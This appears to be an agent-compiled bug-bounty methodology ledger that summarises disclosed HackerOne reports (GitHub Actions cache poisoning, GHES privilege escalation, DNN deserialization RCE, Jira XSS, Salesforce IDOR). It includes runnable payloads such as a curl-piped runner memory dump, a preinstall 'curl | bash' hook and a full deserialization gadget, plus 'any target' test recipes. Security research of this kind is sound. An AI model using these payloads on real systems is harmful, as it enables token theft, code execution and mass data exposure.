SOURCE: https://hackerone.com/reports/2410111  2026-11-11
ROUTE: live `.json` -> HTTP 200, `visibility: no-content`, `vulnerability_information` 0 B (the reporter body is NOT public; the live HTML page and the browser tool both return the HackerOne sign-in/Cloudflare wall). The technique was read IN FULL from the reporter's OWN credited public writeup — adnanthekhan, "The Monsters in Your Build Cache — GitHub Actions Cache Poisoning" (adnanthekhan.com, published 2024-05-06), read this pass via the browser tool (`document.body.innerText`, 36,919 chars; `web_extract` and `r.jina.ai` both elided the middle of the article). Metadata: Linux Foundation Decentralized Trust (hyperledger), "Docker Secret Disclosure via GitHub Actions Cache Poisoning", weakness Information Disclosure, severity High 8.9 (AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:L), reporter `adnanthekhan`, submitted 2024-03-09, disclosed 2024-04-20, state Closed/Resolved, 56 votes, asset hyperledger/besu.
STATUS: UNVERIFIED (not reproduced — no GitHub Actions workflow or repository was touched this pass; every quote below is verbatim from the credited writeup).
CLASS: CI/CD build-cache poisoning ("Actions Cache Blasting") — steal the Actions runtime token + cache URL from a default-branch workflow, fill the repository cache past the 10 GB limit to force eviction, then re-upload a poisoned cache entry under the target's key+version; the privileged workflow restores it as a HIT and blindly extracts a tar archive that overwrites arbitrary files in its working directory -> code execution in the privileged workflow -> secret / Docker-registry credential theft (CWE-345/CWE-494 -> CWE-94).
CORE METHOD:
  1. THE CREDENTIALS, verbatim: "When an Actions workflow starts, it receives a several secrets from GitHub. Among these secrets are the `GITHUB_TOKEN,` ... but there are other values like the AccessToken (also referenced as the `ACTIONS_RUNTIME_TOKEN`) and CacheServerUrl. The runtime token is used to authenticate with GitHub's non-public API endpoints for workflow run artifacts and caches."
  2. THE EXTRACTION, verbatim: `BLOB=\`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"AccessToken":"[^"]*"\}' | sort -u\`` and the same grep for `CacheServerUrl` — dump the runner's memory and grep for the two fields. "This script only works for GitHub hosted Linux runners as they allow sudo without a password."
  3. THE WINDOW, verbatim: "the Actions runtime token was valid for 6 hours, and it was not invalidated after the workflow run conclusion." (GitHub closed that report as informative / working-as-intended.)
  4. THE IMMUTABILITY PROBLEM, verbatim: "cache entries are immutable. They can be deleted, but it requires a GITHUB_TOKEN with actions: write or a similarly privileged token. For the purposes of this attack path we will assume that the GITHUB_TOKEN is read-only."
  5. THE BLAST, verbatim: "GitHub's cache is limited to 10 GB per repository. Once the limit is reached, the least recently used entries are subject to eviction." / "If an attacker can set as many cache entries as they want from any workflow, this allows them to fill the cache full of entries in order to force eviction of other cached items. Once the cache eviction job runs, the 'reserved' cache entries will be cleared and the attacker can poison those entries with malicious files."
  6. THE POISON UPLOAD, verbatim: `python3 CacheUpload.py --file-path poisoned_cache.tzstd --key <target_key> --version <target_version> --auth-token $CAPTURED_TOKEN --cache-url $CAPTURED_URL` — run every minute for the eviction window. Enumerate the legitimate keys/versions with `https://api.github.com/repos/<owner>/<repo>/actions/caches?ref=refs/heads/main`.
  7. THE SINK, verbatim: "The cache object itself is just a compressed archive ... The action does not actually check if the paths specified in the cache configuration are what is actually in the file prior to extracting it. ... `extractTar` does not perform further validation." / "Tar will overwrite files by default when extracting. This means that if someone can poison a cache entry, they can overwrite any file within the working directory at the time of the cache hit."
  8. THE PAYLOAD, verbatim: "if you are trying to poison a nodejs project, you can modify the package.json file and add a preinstall step to contain your payload" — `"preinstall": "curl -sSfL https://gist.githubusercontent.com/.../test1.sh | bash"`. Fallback, verbatim: "Modifying the action.yml or index.js for these actions is guaranteed to provide arbitrary code execution" (reusable actions are saved to the runner's temp dir).
  9. THE IMPACT FOR THIS REPORT, verbatim: "hyperledger/besu - $2,000 Bug Bounty - Impact: Docker Secret Disclosure (an attacker would be a able to push poisoned Besu Docker images to Dockerhub!) Besu is an Ethereum client, which means an attacker could steal the client's private key from within the container."
DETECTION SIGNAL: a repository whose CI runs UNTRUSTED code in the context of the DEFAULT branch (`pull_request_target` with a read-only `GITHUB_TOKEN`, a script injection via `github.head_ref`/`github.event.*`, or a compromised dependency) AND any OTHER workflow in the same repository uses `actions/cache` (or `setup-go`/`setup-node`/`setup-python` v4+, which enable caching by default); a workflow that prints the runner env (`env | grep -i ACTIONS`) or a memory dump; a cache key derived from a lockfile hash with a `restore-keys` prefix; a repository cache near the 10 GB limit. TELL: the `ACTIONS_RUNTIME_TOKEN`/`CacheServerUrl` pair is present in EVERY workflow's environment regardless of whether it uses caching — so any code execution in the default branch is a cache-poisoning primitive.
CHAIN: any attacker who can execute code in a default-branch workflow (primitive: a `pull_request_target` pwn request, a branch-name script injection, or a poisoned dependency — note the `GITHUB_TOKEN` may be read-only and no secrets may be in that workflow) -> dump the runner memory to recover `ACTIONS_RUNTIME_TOKEN` + `CacheServerUrl` (primitive: a 6-hour cache-write credential) -> fill the repository cache with junk entries past 10 GB to force eviction of the target entries (escalation: immutability defeated by the eviction job) -> re-upload a poisoned tar under the target's key+version (escalation: the privileged workflow's next run gets a cache HIT) -> the restore blindly extracts the tar and overwrites files in the working directory (escalation: arbitrary file overwrite) -> the privileged workflow executes the overwritten file (package.json preinstall / action.yml / goreleaser / Makefile) (impact: code execution in the privileged workflow's context, with its secrets and OIDC assumptions — for hyperledger/besu, the Docker Hub push credential -> poisoned Besu images -> the reporter's own words: "Docker Secret Disclosure ... an attacker could steal the client's private key from within the container"; the same writeup proves the chain against angular.dev deployment secrets, MDN, and a GCP release-signing principal). Per doctrine §8: preconditions = code execution in a default-branch workflow of a repository that also has a caching privileged workflow, plus a reachable cache token (the 6-hour window); gain = code execution in the privileged workflow and its secrets/registry credentials.
TRANSFERABLE TEST: on ANY target with GitHub Actions — (1) find a workflow that runs untrusted code on the default branch (`pull_request_target`, `workflow_run`, a `run: echo "${{ github.head_ref }}"` script injection, or a dependency you can influence) AND another workflow that uses `actions/cache`/`setup-*/v4`; (2) in the untrusted workflow, dump the runner memory and grep for `AccessToken`/`CacheServerUrl` (the memdump one-liner above) — if you get both, you have a cache-write credential valid ~6 h; (3) enumerate the privileged workflow's cache keys with `GET /repos/<owner>/<repo>/actions/caches?ref=refs/heads/main`; (4) build a tar containing a file the privileged workflow will execute (`package.json` with a `preinstall` curl|bash, or a reusable action's `action.yml`/`index.js`), and upload it under the target key+version with `CacheUpload.py`; if a later run of the privileged workflow executes your payload (a callback hit), the chain is proven. Rule: **any code execution in a default-branch GitHub Actions workflow is a cache-poisoning primitive — the runtime token + cache URL are in the environment of EVERY job, and the 10 GB eviction limit is the weapon that defeats cache immutability.**
DEDUPE: 0 hits across all three write targets for `2410111`, `CacheServerUrl`, `ACTIONS_RUNTIME_TOKEN`, `ActionsCacheBlasting`, `cache blasting`, `restore-keys`, `memdump`, `cache eviction`, `10 GB`, or a GitHub-Actions cache-poisoning chain. Pre-existing CI-cache material REVIEWED and NOT re-recorded (different mechanism): §17.53 (Mozilla fxa / NX Cloud #2255750 — a remote-cache artifact key that accepts a REPEATED upload because the authorized link is not immutable; no runtime token, no eviction, no tar-extract sink), the CI-cache traversal entry (~line 7864 of the harvest ledger — a user-supplied cache `key`/`paths` concatenated into a URL/filesystem path with no traversal check), and the CI-metadata entry (~line 10144). None records the GitHub-Actions-specific chain (runtime-token theft -> cache blasting past 10 GB -> poisoned tar -> blind extractTar -> privileged-workflow RCE). New general method -> §17.436.

SOURCE: https://hackerone.com/reports/2197796  2026-11-11
ROUTE: live `.json` -> HTTP 200, `visibility: no-content`, `vulnerability_information` 0 B; the live HTML page and the browser tool both return the HackerOne sign-in/Cloudflare wall. The technique was read from the public GitHub advisory GHSA-9g9p-wc7c-q948 (`api.github.com/advisories?cve_id=CVE-2023-46647`) plus the GitHub Enterprise Server 3.8/3.9/3.10 release notes and the public Management Console REST API docs (`github/docs` `content/rest/enterprise-admin/management-console.md`), all read this pass. Metadata: GitHub, "GHES Management console EoP (editor to site admin)", weakness Improper Access Control - Generic, severity High (team), CVE-2023-46647, reporter `imrerad`, submitted 2023-10-08, disclosed 2024-01-08, state Closed/Resolved, 56 votes, asset GitHub Enterprise Server (HARDWARE, max_severity critical).
STATUS: UNVERIFIED (not reproduced — no GHES appliance was touched this pass; every quote below is verbatim from the public advisory/release notes/docs).
CLASS: privilege escalation / improper privilege management — a Management Console user with the low-privilege EDITOR role can call the instance's BOOTSTRAP endpoint family (`/setup/api/*`) without the root site administrator password, and then reset the root site administrator password -> site administrator (CWE-269).
CORE METHOD:
  1. THE ADVISORY, verbatim: "Improper privilege management in all versions of GitHub Enterprise Server allows users with authorized access to the management console with an editor role to escalate their privileges by making requests to the endpoint used for bootstrapping the instance." (GHSA-9g9p-wc7c-q948 / CVE-2023-46647; CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H = 8.0; CWE-269; fixed 3.8.12 / 3.9.6 / 3.10.3 / 3.11.0.)
  2. THE IMPACT, verbatim (GHES 3.8.12 release notes): "An attacker with access to a Management Console user account with the editor role could escalate privileges by making requests to the endpoint used for bootstrapping the instance, and then reset the root site administrator password."
  3. THE ENDPOINT FAMILY, verbatim (public docs): the Management Console API is `http(s)://HOSTNAME:8443/setup/api/...` (port 8443 with TLS, 8080 without) — `GET /setup/api/configcheck`, `POST /setup/api/configure`, `GET|POST /setup/api/maintenance`, `GET|PUT /setup/api/settings`, `GET|POST|DELETE /setup/api/settings/authorized-keys`, `POST /setup/api/start` (Create a GitHub license), `POST /setup/api/upgrade`. The docs' own auth model: "You need to pass your root site administrator password as an authentication token to every endpoint in this category except Create a GitHub license" AND "Management Console user accounts can also authenticate to access this endpoint" (`curl -L -u "YOUR_USER_NAME:YOUR_PASSWORD" 'https://HOSTNAME:ADMIN-PORT/setup/api'`).
  4. THE SHAPE, therefore: the bootstrap/setup endpoint family is reachable by a Management Console USER (editor role) and is not restricted to the root site administrator; the editor can drive the instance's bootstrap/configuration and then reset the root site administrator password.
  5. THE FAMILY, verbatim (public HackerOne profile / CVE records): the same Management Console editor role is the precondition for a sibling family — CVE-2024-1374 (nomad template injection in audit-log forwarding -> admin SSH), CVE-2024-1378 (SMTP), CVE-2024-1355 (actions-console service URL), CVE-2024-2443 / CVE-2024-3646 / CVE-2024-3684 / CVE-2024-0507 / CVE-2024-1372 (command injection in GeoJSON / Artifact & Logs / Migrations Storage / SAML). The editor role was later deprecated.
DETECTION SIGNAL: an appliance/on-prem product with a MANAGEMENT CONSOLE that exposes a SETUP/BOOTSTRAP/INITIALIZATION endpoint family (`/setup/*`, `/bootstrap/*`, `/install/*`, `/configure/*`, `/init/*`) on a separate admin port; a low-privilege console role (editor/operator/read-write) that can authenticate to that family; a password-reset or credential-setting operation reachable from the bootstrap flow; a role model where the console user is NOT the root/site administrator. TELL: the docs say the bootstrap endpoint is the ONE endpoint that does NOT require the root site administrator password ("every endpoint in this category except Create a GitHub license") — and the console-user auth path is documented as sufficient for the whole `/setup/api` category.
CHAIN: a user with the Management Console EDITOR role (primitive: a low-privilege operator, not the site administrator) -> authenticates to the `/setup/api` bootstrap family with the console-user credentials (primitive: the bootstrap endpoint is reachable by a console user, not restricted to the root site admin) -> drives the instance's bootstrap/configuration and resets the root site administrator password (escalation: a credential-setting operation in the bootstrap flow) -> authenticates as the root site administrator (impact: full site-admin control of the GHES instance — all repositories, all users, all secrets; the advisory's own CVSS 8.0 C:H/I:H/A:H). A P4-looking "an editor can call a setup endpoint" raised to site admin. Per doctrine §8: preconditions = a Management Console account with the editor role (no site-admin credential); gain = root site administrator.
TRANSFERABLE TEST: on ANY appliance/on-prem management console — (1) enumerate the setup/bootstrap/initialization endpoint family on the admin port (`/setup/*`, `/bootstrap/*`, `/install/*`, `/configure/*`, `/init/*`, `/api/setup*`); (2) authenticate with the LOWEST-privilege console role (editor/operator/read-write), not the root/site admin; (3) call every bootstrap endpoint and look for a password-reset / credential-set / user-create / license-start operation; (4) if any succeeds, use it to set the root/site-administrator credential and log in as site admin. Rule: **a setup/bootstrap endpoint that authenticates a low-privilege console role but performs a credential-setting operation is a direct privilege-escalation path to site administrator — the bootstrap flow is the one place where the role check is often missing.**
DEDUPE: 0 hits across all three write targets for `2197796`, `CVE-2023-46647`, `GHSA-9g9p-wc7c-q948`, `bootstrap endpoint`, `/setup/api`, `management console` + `bootstrap`, or an editor-role -> site-admin escalation. Pre-existing GHES Management Console material REVIEWED and NOT re-recorded (different sink): §17.300 (#2332623, CVE-2024-1374 — a config field rendered as a nomad template -> command injection -> admin SSH; the sink is a template renderer, not the bootstrap endpoint, and the impact is SSH, not site admin), and the GHES compare/gist entries (#3124517 CVE-2025-8447, #1901040). None records the bootstrap-endpoint -> reset-root-site-admin-password chain. New general method -> §17.437.

SOURCE: https://hackerone.com/reports/2082680  2026-11-11
ROUTE: live `.json` -> HTTP 200, `visibility: no-content`, `vulnerability_information` 0 B (the reporter body is NOT public); the team summary is public. The concrete method was read from the PUBLIC body of the sibling report https://hackerone.com/reports/2068830 (rafsanzani, "HackerOne Support System Doesn't Require Any Authentication May Lead Unauthorized Action", same asset support.hackerone.com, disclosed 2023-08-11), which the HackerOne team summary on #2082680 itself identifies as the original report describing the same vulnerability ("Due to human error, we incorrectly triaged #2082680 as the original report when this was the first one describing the same vulnerability."). Metadata: HackerOne, "Register & create a ticket as somebody else on HackerOne Support", weakness Misconfiguration, severity None (team), reporter `slothzap`, submitted 2023-07-24, disclosed 2023-07-31, state Resolved, asset support.hackerone.com (URL, max_severity none).
STATUS: UNVERIFIED (not reproduced — no support portal was touched this pass; the method below is quoted from the sibling report's public body and the assigned report's team summary).
CLASS: server-side misconfiguration / identity mis-attribution — a support-desk portal's ticket-creation form does not authenticate the requester and binds the ticket to a user-supplied email/identity, so any visitor can file a ticket as another user and the support desk acts on it (CWE-287 / CWE-863).
CORE METHOD:
  1. THE ASSIGNED REPORT'S TEAM SUMMARY, verbatim: "The Hacker was able to submit tickets on HackerOne Support (https://support.hackerone.com) under the identity of different people. We've resolved the issue by changing a setting in the Freshdesk Software."
  2. THE SIBLING REPORT'S STEPS, verbatim: "We need to open a support ticket from this URL https://support.hackerone.com/support/tickets/new. To open the ticket system doesn't need to require any authentication. If I have the email address & username of H1 account, I can request a support ticket for the H1 account. After requesting the support ticket, H1 support agent takes action accordingly."
  3. THE DEMONSTRATED IMPACT, verbatim: "To test I opened a support ticket 460752. I requested to delete my account even I didn't open any account on support.hackerone.com The support agent already processed the request & forwarded it to the relevant department."
  4. THE RECOMMENDED FIX, verbatim: "To open a support ticket user should register here https://support.hackerone.com then need to create the support ticket. Otherwise, there needs an email verification step with OTP to open a support request without login."
DETECTION SIGNAL: a support/helpdesk portal (Freshdesk, Zendesk, HelpScout, Intercom) whose ticket-creation form is reachable WITHOUT authentication and lets the visitor set the requester's name/email; a ticket that is bound to the supplied identity and routed to an agent who performs account actions (deletion, data disclosure, password reset, refunds) without re-verifying ownership; a "Sign up with us" link beside the ticket form. TELL: the form accepts an arbitrary `requester email` and the ticket is treated as authoritative — the portal's identity model is "whoever says they are the requester is the requester".
CHAIN: any unauthenticated visitor (primitive: a public support form) -> submits a ticket with the VICTIM's name/email as the requester (primitive: the form does not authenticate or verify the requester) -> the ticket is bound to the victim's identity and assigned to an agent (escalation: the support desk treats it as a legitimate request from the account holder) -> the agent performs an account-bound action (account deletion, data disclosure, recovery change) (impact: an unauthorized action on the victim's account, driven by the attacker; the sibling report's own demonstration: "I requested to delete my account even I didn't open any account ... The support agent already processed the request"). Per doctrine §8: preconditions = knowledge of the victim's email/username (often public) and a support portal that does not authenticate the requester; gain = an account-bound action performed by the support desk on the victim's behalf.
TRANSFERABLE TEST: on ANY support/helpdesk portal — (1) open the ticket-creation form (`/support/tickets/new`, `/help`, `/contact`) in a fresh session with no login; (2) set the requester name/email to a VICTIM's address (use a test account you own as the "victim"); (3) submit a benign but account-bound request (a data-access request, a deletion request, a password-reset request); (4) check whether the ticket is created and whether the portal's follow-up (email, agent action) is bound to the victim's identity; (5) check whether an email-verification/OTP step exists — its absence is the defect. Rule: **a support portal that lets an unauthenticated visitor set the requester identity is an impersonation primitive — the support desk is the executor, so the ticket form is the entry point for account-bound actions against any user whose email you know.**
DEDUPE: the inbound-EMAIL variant of this class is recorded at §17.111 (HelloFax / HackerOne #1428385 — an email-gateway action endpoint trusts the `From:` header, so any sender performs an account-bound action as another user; its TRANSFERABLE TEST says "find every 'email us at X to do Y' feature"). The DELTA here is the ENTRY POINT: the unauthenticated WEB PORTAL ticket form (Freshdesk), where the requester identity is a form field rather than a mail header, and the fix is a portal setting rather than SPF/DKIM. 0 hits across all three write targets for `2082680`, `2068830`, `support.hackerone.com` + ticket, `Freshdesk` + ticket form, or an unauthenticated support-portal ticket-impersonation chain. Recorded as a DELTA of §17.111, NO new §17 slot. HONESTY NOTE: the assigned report's own body is `no-content`; the method is quoted from the sibling report's public body and the assigned report's team summary. The team rated the assigned report None and paid a bonus without bounty; the chain's impact depends on a support agent acting on the spoofed ticket, so it is recorded as a misconfiguration-with-account-impact primitive, not a standalone critical.

SOURCE: https://hackerone.com/reports/876708  2026-11-11
ROUTE: live `.json` -> HTTP 200, `visibility: full`, `vulnerability_information` 1,958 B read IN FULL (the reporter body is public). Metadata: U.S. Dept Of Defense, "Remote Code Execution through DNN Cookie Deserialization", weakness OS Command Injection, severity High (7~8.9), reporter `cristiancornea`, submitted 2020-05-17, disclosed 2020-05-27, state Closed/Resolved, asset U.S. Dept Of Defense.
STATUS: UNVERIFIED (not reproduced — no DNN/DotNetNuke instance was touched this pass; every quote below is verbatim from the report body).
CLASS: insecure deserialization -> RCE / arbitrary file write — a cookie the product deserializes with .NET BinaryFormatter is the entry point, and the gadget chain is built from the product's OWN class (`DotNetNuke.Common.Utilities.FileSystemUtils`), so no third-party dependency is needed (CWE-502 -> CWE-78 / CWE-94).
CORE METHOD:
  1. THE SINK, verbatim: "The application at ```https://████████``` presents a deserialization vulnerability that permits RCE and file read/write" — the sink is the `DNNPersonalization` COOKIE: "Add this cookie in the request header: ```DNNPersonalization``` / Insert the payload into the ```DNNPersonalization``` cookie."
  2. THE TRIGGER, verbatim: "Navigate to a random page that must return a 404 Error status like ```https://████/test```" — the cookie is deserialized on ANY page, so a 404 is the cheapest unauthenticated trigger.
  3. THE GADGET, verbatim (the reporter's own payload): `<profile><item key="name1:key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=█████████]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=███████"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">test</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>` — i.e. `ExpandedWrapper<FileSystemUtils, ObjectDataProvider>` with `MethodName = WriteFile` and the method parameter = the target path (`test`).
  4. THE TOOLCHAIN, verbatim: "You can generate a payload with the following tool https://github.com/pwntester/ysoserial.net, using the DotNetNuke plugin, or use the official exploit from here: https://www.exploit-db.com/exploits/48336".
  5. THE PRODUCT/VERSION, verbatim: "Vulnerable Product: DotNetNuke / Vulnerable Version: < 9.3.0-RC".
  6. THE IMPACT, verbatim: "An attacker can execute remote commands on the system and gain unauthorized access to it." (WriteFile -> drop a web shell -> command execution; the title is "Remote Code Execution through DNN Cookie Deserialization".)
DETECTION SIGNAL: a DNN/DotNetNuke site that sets or accepts a `DNNPersonalization` cookie (or any `DNN*` personalization cookie) on a page that does not require auth (a 404, a login page, a public post); a `.ASPX` site whose error/trace output mentions `DotNetNuke`; a cookie whose value is a .NET serialized blob (binary / `AAAA...`) rather than a session id; a product version below 9.3.0-RC. TELL: the cookie is deserialized by the product's own personalization handler, so the gadget can use a class the product SHIPS (`DotNetNuke.Common.Utilities.FileSystemUtils`) — no third-party dependency is needed.
CHAIN: any unauthenticated visitor (primitive: a public page that deserializes the cookie) -> send `Cookie: DNNPersonalization=<ExpandedWrapper<FileSystemUtils> WriteFile payload>` (primitive: the cookie is deserialized with BinaryFormatter and the gadget chain is built from the product's own class) -> the gadget writes an arbitrary file (escalation: arbitrary file write) -> the written file is a web shell / executable in the web root -> command execution as the web server identity (impact: RCE + unauthorized access; the report's own words: "An attacker can execute remote commands on the system and gain unauthorized access to it"; team severity High). Per doctrine §8: preconditions = none (unauthenticated, any page); gain = RCE / arbitrary file write on the server.
TRANSFERABLE TEST: on ANY DNN/DotNetNuke target — (1) find a page that does not require auth and that sets/reads a `DNNPersonalization` cookie (a 404 page is the cheapest; capture the cookie from a normal visit); (2) generate a ysoserial.net `ExpandedWrapper` payload whose `ObjectInstance` is `DotNetNuke.Common.Utilities.FileSystemUtils` and whose `MethodName` is `WriteFile`, with the method parameter set to a path you can observe (a file in the web root, or `/tmp/<marker>`); (3) send the payload as the `DNNPersonalization` cookie on the 404 page; (4) check whether the file appears / whether a follow-up request executes it. Rule: **when a product deserializes a cookie, the gadget chain does not need a third-party dependency — use the product's OWN utility class (here DNN's `FileSystemUtils.WriteFile`) as the sink, and trigger it on an unauthenticated page.**
DEDUPE: 0 hits across all three write targets for `876708`, `DNNPersonalization`, `DotNetNuke`, `ExpandedWrapper`, `FileSystemUtils`, `ObjectDataProvider`, `WriteFile`, or a cookie-deserialization -> file-write -> RCE chain. The .NET deserialization material that exists (Bugbountyskills.md ~line 8365 `.NET BinaryFormatter/TypeConfuseDelegate`) records the GENERIC .NET gadget families, not the DNN `ExpandedWrapper<FileSystemUtils>` cookie chain; the Java ysoserial entries are a different platform. SOURCE: https://hackerone.com/reports/380354  2026-11-11
ROUTE: `web_extract` of the live report page -> HTTP 200, full reporter body + comments read IN FULL (the live page renders from this egress). Metadata: Roblox, "Reflected XSS through multiple inputs in the issue collector on Jira", weakness Cross-site Scripting (XSS) - Reflected, severity Medium (4~6.9), CVE-2018-5230, reporter `jackb898`, submitted 2018-07-11, disclosed 2020-03-24, state Closed/Resolved, asset Roblox (jira.roblox.com).
STATUS: UNVERIFIED (not reproduced — no Jira instance was touched this pass; every quote below is verbatim from the report body/comments).
CLASS: reflected XSS behind a quote-asymmetry sanitizer — the filter escapes ONE quote character but not the other, so the payload is the SAME tag with the OTHER quote character (CWE-79).
CORE METHOD:
  1. THE FINGERPRINT -> CVE STEP, verbatim: "I noticed when testing that your Jira installation at jira.roblox.com is running on version 7.6.3, which isn't the latest version. ... I found CVE-2018-5230, which isn't very helpful but it led me in the direction of the issue collector." — the CVE names the attack surface ("XSS in the issue collector") but not the inputs, so the reporter enumerated them.
  2. THE ENTRY POINT, verbatim: "1ST AREA https://jira.roblox.com/issues/?filter=-8 in the 'Updated Date' section." — the inputs are the filter form's date fields: "Put your XSS payload in 'More than [ ] minutes ago' (15 character payload limit) or in 'In range [ ] to [ ]' (No length limit, ONLY put the payload in the first box)"; then "Click Update / Payload will run." The same method works on `?filter=-7` and `?filter=-6`.
  3. THE FILTER, verbatim: "There's only one filter that I've found for these; when using certain HTML tags like "src=" and in JS alerts using alert("texthere"), it appends two backslashes, ex. if you put in this payload: `<iframe src="//google.com"></iframe>` The output in the page will be: `<iframe src=\"//google.com\"></iframe>`".
  4. THE BYPASS, verbatim: "HOWEVER I found a bypass to this filter; instead of using double quotes, simply use all single quotes in payloads. For example if you use the payload `<iframe src='//google.com'></iframe>` The output will be: `<iframe src="//google.com"></iframe>`" — the sanitizer escapes `"` (appends `\`) but leaves `'` untouched, so the attribute is emitted intact.
  5. THE IMPACT, verbatim: "the cookies from Roblox's core site are shared with this one as well ... An attacker could use carefully crafted payloads with simple social engineering to steal Roblox user's accounts." / "with XSS you can use specially designed iframes linked to your own JS content, allowing jacking of cookies and other information from the victim."
  6. THE FIX, verbatim: "Update your JIRA version to 7.6.7 or later".
DETECTION SIGNAL: a reflected input whose response shows your double-quoted attribute backslash-escaped (`src=\"//x\"`) while a single-quoted attribute is emitted verbatim; a sanitizer that appends a backslash to `"` but not to `'`; a filter form with multiple reflected fields (date ranges, "more than N minutes ago") where the payload goes in the field with NO length limit; a product whose version is behind the latest (fingerprint -> CVE -> enumerate the CVE's attack surface). TELL: the differential is visible in the RESPONSE BODY — send the same tag twice, once with `"` and once with `'`, and diff the output.
CHAIN: any visitor (primitive: a public Jira issue-collector filter page) -> send `https://jira.roblox.com/issues/?filter=-8` with the payload in the "In range [ ] to [ ]" first box (primitive: the input is reflected) -> the sanitizer escapes `"` but not `'`, so `<iframe src='//attacker/...'>` is emitted intact (escalation: the filter is defeated by a one-character change) -> the victim opens the crafted filter link and the iframe/JS runs in the `jira.roblox.com` origin (escalation: script execution) -> the core Roblox cookies are shared onto that domain, so the script reads them (impact: account takeover; the reporter's own words: "An attacker could use carefully crafted payloads with simple social engineering to steal Roblox user's accounts"). Per doctrine §8: preconditions = the victim clicks a crafted link (reflected XSS, UI:R) and the target domain shares cookies with the core site; gain = the victim's Roblox session cookie -> account takeover.
TRANSFERABLE TEST: on ANY reflected input — (1) send a benign tag with DOUBLE quotes (`<iframe src="//x"></iframe>`) and inspect the response: if the output shows `src=\"//x\"` (a backslash appended to each `"`), the sanitizer is escaping double quotes; (2) immediately resend the SAME tag with SINGLE quotes (`<iframe src='//x'></iframe>`) — if the output is unchanged, the quote-asymmetry bypass is live; (3) confirm execution with a proof-of-concept that makes an outbound request (an iframe/script to an interact-shaker URL), not just an alert; (4) where the input is a FILTER form, prefer the field with NO length limit and put the payload in the FIRST box only. Rule: **a sanitizer that escapes one quote character almost never escapes the other — always probe with `"` first and read the backslash in the response, then switch to `'`.**
DEDUPE: 0 hits across all three write targets for `380354`, `CVE-2018-5230`, `issue collector`, `jira.roblox`, `filter=-8`, or a quote-asymmetry sanitizer bypass. Pre-existing XSS material REVIEWED and NOT re-recorded (different mechanism): the ledger's single-quoted breakout payloads (GitLab emoji `http://aaa#'><img onerror=...>`, the XSS payload lists) are breakouts, not the "escape-one-quote-but-not-the-other" differential; the Slack scheme-handler entry (methodologies-2026-11-10) is a JS-eval sink that leaves the single quote unmodified, not an HTML-attribute sanitizer. New general method -> §17.439.

SOURCE: https://hackerone.com/reports/2623715  2026-11-11
ROUTE: live `.json` -> HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL (the reporter body is public). Metadata: U.S. Dept Of Defense, "Sensitive data exposure: █████████ candidate resumes/CVs available to download with no authentication through BAC/IDOR/Improper Salesforce config", weakness Improper Access Control - Generic, severity High (7~8.9), reporter `oxylis`, submitted 2024-07-25, disclosed 2024-12-18, state Closed/Resolved, asset U.S. Dept Of Defense.
STATUS: UNVERIFIED (not reproduced — no Salesforce Experience Cloud instance was touched this pass; every request shape below is verbatim from the report body).
CLASS: broken access control / IDOR -> mass sensitive-file read — a Salesforce Experience Cloud (Lightning/Aura) site executes arbitrary Aura `ApexActionController` and component-controller methods without checking the visitor's access, and the file-download endpoint serves any `ContentDocument` by id with no authentication (CWE-863 / CWE-639).
CORE METHOD:
  1. ENTRY POINT — a public Experience Cloud page (here `/s/registration`) makes POSTs to `/s/sfsites/aura?r=1&aura.ApexAction.execute=1`. The body's `message` parameter is a JSON object with an `actions` array; each action has a `descriptor` and `params`. The page's own action is `aura://ApexActionController/ACTION$execute` with `params: {"namespace":"","classname":"RegistrationCtrl","method":"getFileUploadRecord","cacheable":false,"isContinuation":false}`.
  2. THE BYPASS — replace the `descriptor` with a DIFFERENT controller's method: `serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems` and set `params: {"entityNameOrId":"ContentDocument","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}`. The Aura endpoint executes it and returns 2000 `ContentDocument` records (all uploaded files).
  3. THE READ — extract any `Id` from the response (e.g. `069830000028KJdAAM`) and request `https://<site>/sfsites/c/sfc/servlet.shepherd/document/download/<Id>` — the file downloads with no authentication.
  4. THE IMPACT — thousands of candidate resumes/CVs, transcripts, PII, and any manually uploaded file.
DETECTION SIGNAL: a Salesforce Experience Cloud / Lightning site (`*.experience.cloud`, `*.force.com`, `*.site.com`) whose page posts to `/s/sfsites/aura` (look at the `aura.context`/`aura.pageURI` params and the `X-Sfdc-Lds-Endpoints` header); a `message` JSON whose `actions[].descriptor` is `aura://ApexActionController/ACTION$execute` or a `serviceComponent://...` descriptor; a download URL of the form `/sfsites/c/sfc/servlet.shepherd/document/download/<18-char-id>`. TELL: the endpoint dispatches on the `descriptor` string, so the visitor controls WHICH controller/method runs — the intended method (`RegistrationCtrl.getFileUploadRecord`) is scoped to the user's own upload, but the substituted controller (`SelectableListDataProviderController.getItems`) is not.
CHAIN: any unauthenticated visitor (primitive: a public Experience Cloud page that posts to `/aura`) -> rewrite the `message.actions[0].descriptor` to `serviceComponent://...SelectableListDataProviderController/ACTION$getItems` with `entityNameOrId: ContentDocument` (primitive: the Aura endpoint dispatches on the descriptor and never re-checks the visitor's access to the target controller) -> the endpoint returns up to 2000 `ContentDocument` records (escalation: cross-tenant record enumeration) -> take any `Id` and GET `/sfsites/c/sfc/servlet.shepherd/document/download/<Id>` (escalation: unauthenticated file download) -> mass PII/resume/CV disclosure (impact: large-scale data breach; the report's own words: "Large-scale data breach/candidate PII leak"; team severity High 7~8.9). Per doctrine §8: preconditions = none (unauthenticated, any public Experience Cloud page that posts to `/aura`); gain = every uploaded file on the site.
